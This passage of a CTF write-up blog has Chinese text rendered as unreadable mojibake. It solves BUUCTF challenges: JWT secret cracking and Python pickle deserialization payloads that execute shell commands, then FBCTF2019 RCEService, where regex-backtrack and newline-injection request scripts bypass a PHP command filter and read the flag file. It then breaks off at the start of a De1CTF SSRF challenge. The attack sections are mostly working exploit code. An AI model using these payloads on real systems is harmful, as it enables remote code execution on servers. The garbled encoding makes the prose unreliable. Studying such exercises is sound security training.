¼æ”¹æˆ<code>1</code>äº†ä½†å‘ç°ä¸è¡Œã€‚ã€‚åªèƒ½é€šè¿‡ä¿®æ”¹æŠ˜æ‰£è´­ä¹°(0.0000000001)ï¼š</p><p><img src="/img/kun10.png" alt="kun10"></p><p>å…¶å®æ˜¯ä¸ª302é‡å®šå‘ï¼Œå®šå‘åˆ°äº†<code>b1g_m4mber</code>é¡µé¢ï¼Œä½†æç¤ºæˆ‘ä»¬åªæœ‰<code>admin</code>å¯ä»¥è®¿é—®ï¼š</p><p><img src="/img/kun11.png" alt="kun11"></p><p>å…¶å®è¿™é‡Œå°±æœ‰ç‚¹æ€è·¯äº†ï¼Œæ ¹æ®é¢˜ç›®æç¤º<code>python,pickle</code>ç°åœ¨åªå…è®¸ç®¡ç†å‘˜è®¿é—®ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯åœ¨<code>cookie</code>ä¸­æ‰¾çº¿ç´¢äº†(æ³¨æ„è¿™é‡Œçš„<code>JWT</code>å­—æ®µ)ï¼š</p><p><img src="/img/kun12.png" alt="kun12"></p><p>å…ˆæŠŠ<code>JWT</code>è§£ç ï¼š<code>(https://www.bejson.com/jwt/)</code></p><p><img src="/img/kun13.png" alt="kun13"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ®µ<code>JWT</code>æ˜¯åŒ…å«ç€æˆ‘ä»¬ç”¨æˆ·åçš„æ•°æ®ï¼Œæˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯è‚¯å®šæœ‰ä»€ä¹ˆå­—æ®µåŒ…å«ç€<code>guest</code>ä¹‹ç±»çš„ä¸œè¥¿ï¼Œç„¶åæŠŠå®ƒæ”¹æˆ<code>admin</code>åŠ å¯†ä¼ è¿‡å»ã€‚ã€‚ä½†æ£é¼“äº†åŠå¤©ä¸çŸ¥é“è¿™ä¸ªå­—æ®µè—åœ¨å“ªäº†ï¼Œåé¢å‚è€ƒäº†å…¶å®ƒå¸ˆå‚…çš„wpå‘ç°åŸæ¥æ”¹ä¸ª<code>username</code>å°±è¡Œã€‚ã€‚ã€‚å…ˆåˆ©ç”¨<code>jwtcrack</code>çˆ†ç ´è¿™ä¸ª<code>JWT</code>:</p><p><img src="/img/kun14.png" alt="kun14"></p><p><code>1Kun</code></p><p><img src="/img/kun15.png"></p><p><img src="/img/kun16.png" alt="kun16"></p><p>ç‚¹è¿™ä¸ªæˆä¸ºå¤§ä¼šå‘˜çš„æŒ‰é’®æ²¡å•¥ååº”ã€‚ã€‚çœ‹æºç æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/kun17.png" alt="kun17"></p><p>è®¿é—®<code>ef235c7d-6775-4801-a866-8532c547a07c.node4.buuoj.cn:81/static/asd1f654e683wq/www.zip</code>ï¼Œä¸‹è½½æºç ï¼š</p><p>æ ¹æ®æç¤ºæˆ‘ä»¬æ‰¾å’Œ<code>pickle</code>æœ‰å…³çš„åºåˆ—åŒ–ååºåˆ—åŒ–æ“ä½œå°±è¡Œï¼š</p><p><code>pickle.loads</code>å­˜åœ¨äº<code>Admin.py</code>ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™éƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br><span class="hljs-comment">#è§£ç URLç¼–ç çš„æ•°æ®ï¼Œç„¶åå°†ç»“æœä¼ é€’ç»™pickle.loadsè¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</span><br><span class="hljs-comment">#æˆ‘ä»¬çš„payloadå¯ä»¥å†™æˆï¼š</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urlib.parse<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br><br>a = pickle.dumps(Note())<br>a = urllib.parse.quote(a)<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#%80%04%95%3F%00%00%00%00%00%00%00%8C%08builtins%94%8C%04eval%94%93%94%8C%23__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%94%85%94R%94.</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç åœ¨æˆ‘çš„<code>Kali</code>ä¸‹å¯ä»¥è¿è¡Œï¼Œä½†æ”¾åˆ°é¢˜ç›®ä¸­æ²¡ç”¨ï¼Œä¸çŸ¥é“å•¥åŸå› å»çœ‹äº†<code>wp</code>ï¼š</p><p>é¢˜ç›®çš„æºç æ˜¯ç”¨python2å†™çš„ï¼Œè€Œä¸”pickleè¿™ä¸œè¥¿ä¸æ”¯æŒè·¨ç‰ˆæœ¬æ“ä½œï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯python2å¯ä»¥ä»ä¸‹é¢è¿™å‡ ä¸ªä¾‹å­çœ‹å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)  <span class="hljs-comment">#python2ä¸­printæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤åœ¨ä½¿ç”¨printè¯­å¥æ—¶ä¸éœ€è¦ä½¿ç”¨æ‹¬å·ï¼Œä½†åœ¨python3ä¸­è¿™ä¸œè¥¿æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¦åŠ æ‹¬å·ã€‚</span><br>p = pickle.loads(urllib.unquote(become))<br>    <span class="hljs-comment">#å…¶å®è¿™æ®µä»£ç å°±æ˜¯æŠŠbecomeç»è¿‡URLè§£ç ç»•åè¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œå¦‚æœåœ¨python3ä¸­è¿è¡Œè¿™ä¸ªä¼šæç¤ºæ²¡æœ‰unquoteè¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸œè¥¿è¢«ç§»åŠ¨åˆ°urllib.parseæ¨¡å—ä¸­ï¼Œéœ€è¦from urllib.parse import unquoteç„¶åç›´æ¥a=quote(a)å°±è¡Œã€‚</span><br><span class="hljs-comment">#æ‰€ä»¥æˆ‘ä»¬è¦ç”¨python2å†™ï¼š</span><br><span class="hljs-comment">#`python2`åœ¨çº¿å·¥å…·ï¼š`https://c.runoob.com/compile/6/`</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(Note())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/kun18.png" alt="kun18"></p><p>åé¢å°±ä¸è¯¦ç»†å†™äº†ï¼Œæ”¹æˆ<code>ls / </code>ç„¶å<code>cat /flag.txt</code>è¯»å°±è¡Œ</p><p>å…¶å®è¿™é“é¢˜<code>payload</code>çš„å†™æ³•å¾ˆå¤šï¼Œæˆ‘è§‰å¾—æˆ‘è¿™ä¸ªå¹¶ä¸å¥½(å› ä¸ºç›´æ¥åˆ©ç”¨äº†<code>import</code>å’Œ<code>os</code>ï¼Œæ„Ÿè§‰åœ¨æœ‰äº›é¢˜ä¸­ä¼šè¢«è¿‡æ»¤æ‰ã€‚ã€‚è¿™é‡Œè¡¥å……ä¸€äº›å…¶ä»–å¸ˆå‚…çš„<code>payload</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>a = payload()<br><span class="hljs-built_in">print</span> (urllib.quote(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span> ,))<br><br>a = Test()<br>s = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(urllib.quote(s))<br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/img/rceservice.png" alt="rceservice"></p><p>è¦æ±‚è¾“å…¥å¿…é¡»æ˜¯<code>JSON</code>æ ¼å¼ï¼Œç±»ä¼¼{â€œxxxâ€:â€xxxâ€}è¿™æ ·ï¼Œå¦‚æœåé¢é‚£ä¸ªæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤é‚£å‰é¢çš„é”®è¯¥æ˜¯å¤šå°‘ï¼Ÿé¢˜ç›®ä¹Ÿæ²¡å•¥æç¤ºã€‚ã€‚æ‰¾äº†<code>wp</code>å‘ç°è¿™é¢˜å…¶å®æ˜¯ç»™äº†æºç çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªç¯å¢ƒå˜é‡çš„é…ç½®ï¼Œæœ€å¼€å§‹æ²¡æ³¨æ„è¿™ä¸ªä¸œè¥¿å¯¼è‡´æœ‰äº›å‘½ä»¤æ‰§è¡Œä¸äº†</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123; <span class="hljs-comment">//é™åˆ¶å¿…é¡»æ˜¯å­—ç¬¦ä¸²æ ¼å¼</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<span class="hljs-comment">//^å¼€å¤´$ç»“å°¾,.*è¡¨ç¤ºåŒ¹é…ä»»æ„æ•°é‡çš„ä»»æ„å­—ç¬¦(é™¤æ¢è¡Œå¤–)</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>Enter command as JSON</code>ï¼š<code>&#123;&quot;cmd&quot;%3A&quot;ls&quot;&#125;</code>:</p><p><img src="/img/rceservice2.png" alt="rceservice2"></p><p>é¦–å…ˆæ˜¯<code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>è¿™ä¸œè¥¿ï¼Œå°†ç¯å¢ƒå˜é‡ <code>PATH</code> çš„å€¼è®¾ç½®ä¸º <code>/home/rceservice/jail</code>ã€‚åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>PATH</code> ç¯å¢ƒå˜é‡é€šå¸¸ç”¨äºæŒ‡å®šå¯æ‰§è¡Œç¨‹åºçš„æœç´¢è·¯å¾„ã€‚é€šè¿‡å°† <code>PATH</code> è®¾ç½®ä¸º <code>/home/rceservice/jail</code>ï¼Œå¯ä»¥æŒ‡å®šç³»ç»Ÿåœ¨æ‰§è¡Œå‘½ä»¤æ—¶åªåœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><code>putenv ç›¸å½“äºä¸€ä¸ªç®€é™‹çš„æ²™ç›’, è®© shell é»˜è®¤ä» /home/rceservice/jailä¸‹å¯»æ‰¾å‘½ä»¤, åé¢çœ‹çš„æ—¶å€™å‘ç°è¿™ä¸ªç›®å½•ä¸‹åªæœ‰ä¸€ä¸ª ls, ä½†å…¶å®ä½¿ç”¨ç»å¯¹è·¯å¾„æ‰§è¡Œå‘½ä»¤ (/bin/cat) å°±èƒ½å¤Ÿç»•è¿‡é™åˆ¶äº†  //å‚è€ƒï¼šhttps://exp10it.cn/2022/09/buuctf-web-writeup-5/#fbctf2019rceservice</code></p><p>ç»•è¿‡çš„è¯æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯æ˜¯å›æº¯ç»•è¿‡ï¼Œç¬¬äºŒç§å°±æ˜¯<code>%0A</code>æ¢è¡Œç»•è¿‡ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=1#reply-list</code></p><p><code>https://www.cnblogs.com/yjken/articles/3922339.html</code></p><p>å¤§è‡´æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ è¶…çº§é•¿çš„å­—ç¬¦ä¸²è®©<code>preg_match</code>æ‰§è¡Œå¤±è´¥è¿”å›<code>False</code>ã€‚è¿™æ ·å¦‚æœæœªå¯¹ç»“æœè¿›è¡Œå¼ºç­‰äºåˆ¤æ–­<code>===</code>å°±å¯ä»¥å®ç°ç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://d74b595f-f641-43c5-87fb-36ddfabc88f0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;ls /home/&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#lsæ˜¯å¯ä»¥ç›´æ¥ç”¨çš„</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-comment">#æ³¨æ„è¿™é‡Œè¦ç”¨POSTï¼Œå› ä¸ºGETå¤´ä¸èƒ½å¤ªå¤§å¦åˆ™ä¼šè¿”å›TooLargeRequest</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice3.png" alt="rceservice3"></p><p>å¹¶æ²¡æœ‰<code>flag</code>ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥è°ƒç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾<code>flag</code>æ‰€åœ¨ä½ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag*&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#æ³¨æ„è¿™é‡Œçš„find</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice4.png" alt="rceservice4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&#x27;http://2b9721df-0252-42a0-a191-016990b2c6b0.node4.buuoj.cn:81/&#x27;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">r&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;aa&quot;:&quot;&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span> +<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">#lsæ˜¯å¯ä»¥ç›´æ¥ç”¨çš„</span><br>&#125;<br><br>res = requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/rceservice5.png" alt="rceservice5"></p><p><code>flag&#123;81327f89-050f-46f1-ae16-177e1da4ac08&#125;</code></p><p>æ¢è¡Œç»•è¿‡ä¸»è¦å°±æ˜¯<code>.</code>è¿™ä¸ªä¸œè¥¿ä¸ä¼šå»åŒ¹é…æ¢è¡Œç¬¦ï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯æ„é€ çš„<code>payload</code>å¿…é¡»ç¬¦åˆ<code>JSON</code>è¿™ä¸œè¥¿çš„æ ¼å¼ï¼Œæƒ³äº†æŒºä¹…ä¸çŸ¥é“è¯¥æŠŠæ¢è¡Œç¬¦æ”¾å“ªã€‚</p><p>æœ€å¼€å§‹æ²¡çœ‹æ‡‚å¸ˆå‚…ä»¬çš„<code>wp</code>æ€ä¹ˆå†™çš„ï¼Œæƒ³äº†ä¸€ä¸‹è¿™ä¸œè¥¿å…¶å®å°±å¯ä»¥çœ‹æˆï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>%<span class="hljs-number">0</span>A<span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="hljs-number">0</span>A<span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/rceservice6.png" alt="rceservice6"></p><p>è¿˜æœ‰å…¶å®ƒä¸¤ç§ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%0A%0A&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;%0A%0A<span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span>&#123;%0A<span class="hljs-string">&quot;cmd&quot;</span>:%0A<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š<code>https://www.cnblogs.com/20175211lyz/p/12198258.html</code></p><p><code>https://www.cnblogs.com/Article-kelp/p/16046129.html</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuctfåšé¢˜è®°å½•_3</title>
    <link href="/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/"/>
    <url>/2023/11/04/2023-10-24-buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_3/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•ã€‚</p><span id="more"></span><hr><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><code>Hint:flag is in ./flag.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 